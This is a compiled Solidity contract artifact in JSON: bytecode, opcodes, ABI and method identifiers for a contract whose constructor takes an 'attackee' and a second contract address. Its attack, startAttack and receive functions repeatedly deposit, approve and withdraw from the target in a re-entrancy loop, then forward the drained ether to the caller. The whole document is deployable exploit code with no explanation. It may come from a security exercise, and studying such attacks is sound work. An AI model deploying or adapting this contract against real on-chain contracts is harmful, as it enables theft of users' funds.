{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561001057600080fd5b50604051610be2380380610be28339818101604052810190610032919061011d565b816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505061015d565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100ea826100bf565b9050919050565b6100fa816100df565b811461010557600080fd5b50565b600081519050610117816100f1565b92915050565b60008060408385031215610134576101336100ba565b5b600061014285828601610108565b925050602061015385828601610108565b9150509250929050565b610a768061016c6000396000f3fe6080604052600436106100585760003560e01c80627be6551461006c5780630e29df221461008357806377c00de01461009a5780639e5faafc146100a4578063a3912ec8146100bb578063bc6ec2dd146100d257610067565b36610067576100656100e9565b005b600080fd5b34801561007857600080fd5b5061008161024c565b005b34801561008f57600080fd5b506100986103d0565b005b6100a26104a2565b005b3480156100b057600080fd5b506100b96104f4565b005b3480156100c757600080fd5b506100d0610577565b005b3480156100de57600080fd5b506100e76100e9565b005b6000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163060035460405160240161013992919061076d565b6040516020818303038152906040527fa9059cbb000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516101c39190610807565b6000604051808303816000865af19150503d8060008114610200576040519150601f19603f3d011682016040523d82523d6000602084013e610205565b606091505b5050905080610249576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610240906108a1565b60405180910390fd5b50565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166003546040516024016102bd92919061076d565b6040516020818303038152906040527ff3c40c4b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516103479190610807565b6000604051808303816000865af19150503d8060008114610384576040519150601f19603f3d011682016040523d82523d6000602084013e610389565b606091505b50509050806103cd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103c49061090d565b60405180910390fd5b50565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660035460405161041990610953565b60006040518083038185875af1925050503d8060008114610456576040519150601f19603f3d011682016040523d82523d6000602084013e61045b565b606091505b505090508061049f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610496906109b4565b60405180910390fd5b50565b3460038190555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506104f26104f4565b565b6104fc6103d0565b61050461024c565b61050c610577565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610574573d6000803e3d6000fd5b50565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f5fd8c710000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516106419190610807565b6000604051808303816000865af19150503d806000811461067e576040519150601f19603f3d011682016040523d82523d6000602084013e610683565b606091505b50509050806106c7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016106be90610a20565b60405180910390fd5b60035460008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106107105761070f6104f4565b5b50565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061073e82610713565b9050919050565b61074e81610733565b82525050565b6000819050919050565b61076781610754565b82525050565b60006040820190506107826000830185610745565b61078f602083018461075e565b9392505050565b600081519050919050565b600081905092915050565b60005b838110156107ca5780820151818401526020810190506107af565b60008484015250505050565b60006107e182610796565b6107eb81856107a1565b93506107fb8185602086016107ac565b80840191505092915050565b600061081382846107d6565b915081905092915050565b600082825260208201905092915050565b7f63616c6c696e6720746865207365636f6e6420636f6e7472616374206469642060008201527f6e6f7420676f207468726f756768000000000000000000000000000000000000602082015250565b600061088b602e8361081e565b91506108968261082f565b604082019050919050565b600060208201905081810360008301526108ba8161087e565b9050919050565b7f616c6c6f77616e636520646964206e6f7420676f207468726f75676800000000600082015250565b60006108f7601c8361081e565b9150610902826108c1565b602082019050919050565b60006020820190508181036000830152610926816108ea565b9050919050565b50565b600061093d6000836107a1565b91506109488261092d565b600082019050919050565b600061095e82610930565b9150819050919050565b7f6465706f73697420646964206e6f7420676f207468726f756768000000000000600082015250565b600061099e601a8361081e565b91506109a982610968565b602082019050919050565b600060208201905081810360008301526109cd81610991565b9050919050565b7f776974686472617720646964206e6f7420676f207468726f7567680000000000600082015250565b6000610a0a601b8361081e565b9150610a15826109d4565b602082019050919050565b60006020820190508181036000830152610a39816109fd565b905091905056fea2646970667358221220f9e69b6eaaf8eb05ff1e74c74ece5082d4214de76496cbd792cca48fde2002d064736f6c63430008120033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xBE2 CODESIZE SUB DUP1 PUSH2 0xBE2 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x11D JUMP JUMPDEST DUP2 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH2 0x15D JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xEA DUP3 PUSH2 0xBF JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xFA DUP2 PUSH2 0xDF JUMP JUMPDEST DUP2 EQ PUSH2 0x105 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x117 DUP2 PUSH2 0xF1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x134 JUMPI PUSH2 0x133 PUSH2 0xBA JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x142 DUP6 DUP3 DUP7 ADD PUSH2 0x108 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x153 DUP6 DUP3 DUP7 ADD PUSH2 0x108 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH2 0xA76 DUP1 PUSH2 0x16C PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x58 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH3 0x7BE655 EQ PUSH2 0x6C JUMPI DUP1 PUSH4 0xE29DF22 EQ PUSH2 0x83 JUMPI DUP1 PUSH4 0x77C00DE0 EQ PUSH2 0x9A JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0xA4 JUMPI DUP1 PUSH4 0xA3912EC8 EQ PUSH2 0xBB JUMPI DUP1 PUSH4 0xBC6EC2DD EQ PUSH2 0xD2 JUMPI PUSH2 0x67 JUMP JUMPDEST CALLDATASIZE PUSH2 0x67 JUMPI PUSH2 0x65 PUSH2 0xE9 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x78 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x81 PUSH2 0x24C JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x8F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x98 PUSH2 0x3D0 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xA2 PUSH2 0x4A2 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xB9 PUSH2 0x4F4 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xC7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xD0 PUSH2 0x577 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xDE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xE7 PUSH2 0xE9 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND ADDRESS PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x139 SWAP3 SWAP2 SWAP1 PUSH2 0x76D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xA9059CBB00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x1C3 SWAP2 SWAP1 PUSH2 0x807 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x200 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x205 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x249 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x240 SWAP1 PUSH2 0x8A1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x2BD SWAP3 SWAP2 SWAP1 PUSH2 0x76D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xF3C40C4B00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x347 SWAP2 SWAP1 PUSH2 0x807 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x384 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x389 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x3CD JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3C4 SWAP1 PUSH2 0x90D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH2 0x419 SWAP1 PUSH2 0x953 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x456 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x45B JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x49F JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x496 SWAP1 PUSH2 0x9B4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST CALLVALUE PUSH1 0x3 DUP2 SWAP1 SSTORE POP CALLER PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x4F2 PUSH2 0x4F4 JUMP JUMPDEST JUMP JUMPDEST PUSH2 0x4FC PUSH2 0x3D0 JUMP JUMPDEST PUSH2 0x504 PUSH2 0x24C JUMP JUMPDEST PUSH2 0x50C PUSH2 0x577 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x574 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x5FD8C71000000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x641 SWAP2 SWAP1 PUSH2 0x807 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x67E JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x683 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x6C7 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x6BE SWAP1 PUSH2 0xA20 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x3 SLOAD PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x710 JUMPI PUSH2 0x70F PUSH2 0x4F4 JUMP JUMPDEST JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x73E DUP3 PUSH2 0x713 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x74E DUP2 PUSH2 0x733 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x767 DUP2 PUSH2 0x754 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x782 PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x745 JUMP JUMPDEST PUSH2 0x78F PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x75E JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x7CA JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x7AF JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x7E1 DUP3 PUSH2 0x796 JUMP JUMPDEST PUSH2 0x7EB DUP2 DUP6 PUSH2 0x7A1 JUMP JUMPDEST SWAP4 POP PUSH2 0x7FB DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x7AC JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x813 DUP3 DUP5 PUSH2 0x7D6 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x63616C6C696E6720746865207365636F6E6420636F6E74726163742064696420 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x6E6F7420676F207468726F756768000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x88B PUSH1 0x2E DUP4 PUSH2 0x81E JUMP JUMPDEST SWAP2 POP PUSH2 0x896 DUP3 PUSH2 0x82F JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x8BA DUP2 PUSH2 0x87E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x616C6C6F77616E636520646964206E6F7420676F207468726F75676800000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x8F7 PUSH1 0x1C DUP4 PUSH2 0x81E JUMP JUMPDEST SWAP2 POP PUSH2 0x902 DUP3 PUSH2 0x8C1 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x926 DUP2 PUSH2 0x8EA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x93D PUSH1 0x0 DUP4 PUSH2 0x7A1 JUMP JUMPDEST SWAP2 POP PUSH2 0x948 DUP3 PUSH2 0x92D JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x95E DUP3 PUSH2 0x930 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x6465706F73697420646964206E6F7420676F207468726F756768000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x99E PUSH1 0x1A DUP4 PUSH2 0x81E JUMP JUMPDEST SWAP2 POP PUSH2 0x9A9 DUP3 PUSH2 0x968 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x9CD DUP2 PUSH2 0x991 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x776974686472617720646964206E6F7420676F207468726F7567680000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xA0A PUSH1 0x1B DUP4 PUSH2 0x81E JUMP JUMPDEST SWAP2 POP PUSH2 0xA15 DUP3 PUSH2 0x9D4 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0xA39 DUP2 PUSH2 0x9FD JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xF9 0xE6 SWAP12 PUSH15 0xAAF8EB05FF1E74C74ECE5082D4214D 0xE7 PUSH5 0x96CBD792CC LOG4 DUP16 0xDE KECCAK256 MUL 0xD0 PUSH5 0x736F6C6343 STOP ADDMOD SLT STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "535600",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"addAllowance()": "infinite",
				"attack()": "infinite",
				"call_contract2()": "infinite",
				"receiveEther()": "infinite",
				"sendEther()": "infinite",
				"startAttack()": "infinite"
			}
		},
		"methodIdentifiers": {
			"addAllowance()": "007be655",
			"attack()": "9e5faafc",
			"call_contract2()": "bc6ec2dd",
			"receiveEther()": "a3912ec8",
			"sendEther()": "0e29df22",
			"startAttack()": "77c00de0"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "attackee",
					"type": "address"
				},
				{
					"internalType": "address",
					"name": "second_contract",
					"type": "address"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"inputs": [],
			"name": "addAllowance",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "attack",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "call_contract2",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "receiveEther",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "sendEther",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "startAttack",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}